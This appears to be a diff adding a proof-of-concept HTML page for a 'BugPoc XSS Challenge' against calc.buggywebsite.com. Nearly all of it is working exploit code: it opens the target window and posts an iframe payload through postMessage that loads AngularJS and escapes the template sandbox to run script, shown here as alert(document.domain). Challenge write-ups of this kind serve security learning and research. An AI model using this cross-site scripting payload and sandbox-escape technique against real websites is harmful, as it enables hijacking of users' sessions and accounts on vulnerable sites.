@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Poc XSS about Calculate</title>
+    </head>
+    <script>
+        const win = window.open('http://calc.buggywebsite.com/frame.html');
+        const exploit = function(){
+            setTimeout(function(){ win.postMessage(["<iframe srcdoc=\"<script src=/angular.min.js><\/script><div ng-app>{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(document.domain)');}}</div>\"></iframe>"],'*') }, 3000);
+        }
+      </script>
+    <body>
+        <h1>BugPoc XSS Challenge</h1>
+
+        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
+        <input type="button" onclick=exploit() value="Trigger">
+    </body>
+</html>
